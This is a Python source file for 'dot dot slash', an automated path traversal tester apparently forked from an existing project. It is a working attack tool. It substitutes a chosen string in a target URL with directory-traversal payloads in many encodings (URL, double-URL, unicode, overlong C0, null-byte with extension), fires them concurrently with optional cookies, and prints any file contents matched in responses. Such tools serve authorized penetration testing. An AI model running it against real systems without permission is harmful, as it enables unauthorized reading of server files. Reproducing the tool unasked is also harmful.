#!/usr/bin/python3
import re
import argparse
import sys
import concurrent.futures
import requests
from http.cookies import SimpleCookie
from match import dotvar, match, befvar

# encoding variants for lightweight mode - each represents a different encoding method
lightweight_encodings = {
    'plain': '../',
    'url_encoded': '%2e%2e%2f',
    'double_url_encoded': '%252e%252e%252f',
    'backslash': '..\\',
    'backslash_url_encoded': '%2e%2e%5c', 
    'backslash_double_url_encoded': '%252e%252e%255c',
    'unicode_slash': '..%u2215',
    'unicode_full': '%uff0e%uff0e%u2215',
    'c0_encoding': '%c0%ae%c0%ae%c0%af',
    'double_c0_encoding': '%25c0%25ae%25c0%25ae%25c0%25af',
    'percent_encoding': '%%32%65%%32%65%%32%66'
}

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def codecollors(code):
    if str(code).startswith("2"):
        return "\033[92m[" + str(code) + "] \033[0m"
    elif str(code).startswith("3"):
        return "\033[93m[" + str(code) + "] \033[0m"
    elif str(code).startswith("4"):
        return "\033[91m[" + str(code) + "] \033[0m"
    elif str(code).startswith("5"):
        return "\033[94m[" + str(code) + "] \033[0m"
    else:
        return str(code)

class request(object):
    def query(self, url, cookie=None):
        cookies = None
        if cookie:
            rawdata = "Cookie: " + cookie
            cookies = SimpleCookie()
            cookies.load(rawdata)
        req = requests.get(url, cookies=cookies, allow_redirects=False)
        self.raw = req.text
        self.code = req.status_code

def process_task(fullrewrite, regex_pattern, cookie, verbose):
    req = request()
    req.query(fullrewrite, cookie=cookie)
    catchdata = re.findall(str(regex_pattern), req.raw)
    output_lines = []
    if catchdata:
        output_lines.append(codecollors(req.code) + fullrewrite)
        output_lines.append(" Contents Found: " + str(len(catchdata)))
    else:
        if verbose:
            output_lines.append(codecollors(req.code) + fullrewrite)
    for i, match_item in enumerate(catchdata):
        if i >= 7:
            output_lines.append(" [...]")
            break
        output_lines.append(" " + bcolors.FAIL + str(match_item) + bcolors.ENDC)
    return "\n".join(output_lines)

def forloop(arguments):
    if str(arguments.string) not in str(arguments.url):
        sys.exit("String: " + bcolors.WARNING + arguments.string + bcolors.ENDC +
                 " not found in url: " + bcolors.FAIL + arguments.url + "\n")
    
    duplicate = set()
    for count in range(arguments.min_depth, arguments.max_depth + 1):
        print("[+] Depth: " + str(count))
        tasks = []
        for var in dotvar:
            for bvar in befvar:
                for word, regex_pattern in match.items():
                    # Build the rewrite using the given depth (count) value
                    rewrite = bvar + (var * count) + word
                    # Using re.sub (with re.escape for safety) to substitute the target string
                    fullrewrite = re.sub(re.escape(arguments.string), lambda m: rewrite, arguments.url)
                    if fullrewrite not in duplicate:
                        duplicate.add(fullrewrite)
                        tasks.append((fullrewrite, regex_pattern))
                    
                    # null byte injection when extension is provided
                    if arguments.extension:
                        for ext in arguments.extension:
                            null_byte_rewrite = bvar + (var * count) + word + "%00" + ext
                            null_byte_fullrewrite = re.sub(re.escape(arguments.string), lambda m: null_byte_rewrite, arguments.url)
                            if null_byte_fullrewrite not in duplicate:
                                duplicate.add(null_byte_fullrewrite)
                                tasks.append((null_byte_fullrewrite, regex_pattern))
        if tasks:
            # Use a ThreadPoolExecutor to run requests concurrently.
            with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
                futures = [executor.submit(process_task, t[0], t[1], arguments.cookie, arguments.verbose) for t in tasks]
                for future in concurrent.futures.as_completed(futures):
                    result = future.result()
                    if result:
                        print(result)

def forloop_lightweight(arguments):
    if str(arguments.string) not in str(arguments.url):
        sys.exit("String: " + bcolors.WARNING + arguments.string + bcolors.ENDC +
                 " not found in url: " + bcolors.FAIL + arguments.url + "\n")
    
    duplicate = set()
    for count in range(arguments.min_depth, arguments.max_depth + 1):
        print("[+] Depth: " + str(count) + " (lightweight mode)")
        tasks = []
        
        # iterate through each encoding method
        for encoding_name, var in lightweight_encodings.items():
            for bvar in befvar:
                for word, regex_pattern in match.items():
                    # use the same encoding for all path traversal sequences at this depth
                    rewrite = bvar + (var * count) + word
                    fullrewrite = re.sub(re.escape(arguments.string), lambda m: rewrite, arguments.url)
                    if fullrewrite not in duplicate:
                        duplicate.add(fullrewrite)
                        tasks.append((fullrewrite, regex_pattern))
                    
                    # null byte injection when extension is provided
                    if arguments.extension:
                        for ext in arguments.extension:
                            null_byte_rewrite = bvar + (var * count) + word + "%00" + ext
                            null_byte_fullrewrite = re.sub(re.escape(arguments.string), lambda m: null_byte_rewrite, arguments.url)
                            if null_byte_fullrewrite not in duplicate:
                                duplicate.add(null_byte_fullrewrite)
                                tasks.append((null_byte_fullrewrite, regex_pattern))
        
        if tasks:
            with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
                futures = [executor.submit(process_task, t[0], t[1], arguments.cookie, arguments.verbose) for t in tasks]
                for future in concurrent.futures.as_completed(futures):
                    result = future.result()
                    if result:
                        print(result)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='dot dot slash - An automated Path Traversal Tester. Created by @jcesarstef, ByteMastermind\'s fork')
    parser.add_argument('--url', '-u', action='store', dest='url', required=True, help='Url to attack.')
    parser.add_argument('--string', '-s', action='store', dest='string', required=True, help='String in --url to attack. Ex: document.pdf')
    parser.add_argument('--cookie', '-c', action='store', dest='cookie', required=False, help='Document cookie.')
    parser.add_argument('--depth', '-d', action='store', dest='depth', required=False, type=int, help='How deep we will go? (backward compatibility, sets range 0 to depth)')
    parser.add_argument('--min-depth', action='store', dest='min_depth', required=False, type=int, help='Minimum depth to test (use with --max-depth)')
    parser.add_argument('--max-depth', action='store', dest='max_depth', required=False, type=int, help='Maximum depth to test (use with --min-depth)')
    parser.add_argument('--verbose', '-v', action='store_true', required=False, help='Show requests')
    parser.add_argument('--extension', '-e', action='append', dest='extension', required=False, help='File extension for null byte injection (e.g., ".png", ".txt"). Can be used multiple times.')
    parser.add_argument('--lightweight', '-l', action='store_true', required=False, help='lightweight mode - group similar encodings instead of trying all combinations')
    arguments = parser.parse_args()

    # determine depth range
    if arguments.depth is not None:
        if arguments.min_depth is not None or arguments.max_depth is not None:
            sys.exit("cannot use --depth with --min-depth/--max-depth")
        min_depth = 0
        max_depth = arguments.depth
    elif arguments.min_depth is not None and arguments.max_depth is not None:
        if arguments.min_depth < 0:
            sys.exit("min-depth must be non-negative")
        if arguments.max_depth < arguments.min_depth:
            sys.exit("max-depth must be >= min-depth")
        min_depth = arguments.min_depth
        max_depth = arguments.max_depth
    elif arguments.min_depth is not None or arguments.max_depth is not None:
        sys.exit("both --min-depth and --max-depth must be specified together")
    else:
        # default behavior
        min_depth = 0
        max_depth = 6
    
    arguments.min_depth = min_depth
    arguments.max_depth = max_depth

    banner = "\
         _       _         _       _         _           _     \n\
      __| | ___ | |_    __| | ___ | |_   ___| | __ _ ___| |__  \n\
     / _` |/ _ \| __|  / _` |/ _ \| __| / __| |/ _` / __| '_ \ \n\
    | (_| | (_) | |_  | (_| | (_) | |_  \__ \ | (_| \__ \ | | |\n\
     \__,_|\___/ \__|  \__,_|\___/ \__| |___/_|\__,_|___/_| |_|\n\
                                                           \n\
    Automated Path Traversal Tester\n\
    version 0.0.9\n\
    Created by Julio Cesar Stefanutto (@jcesarstef)\n\
    \n\
    Starting run in: \033[94m" + arguments.url + "\033[0m\n\
    "
    print(banner)
    
    if arguments.lightweight:
        forloop_lightweight(arguments)
    else:
        forloop(arguments)

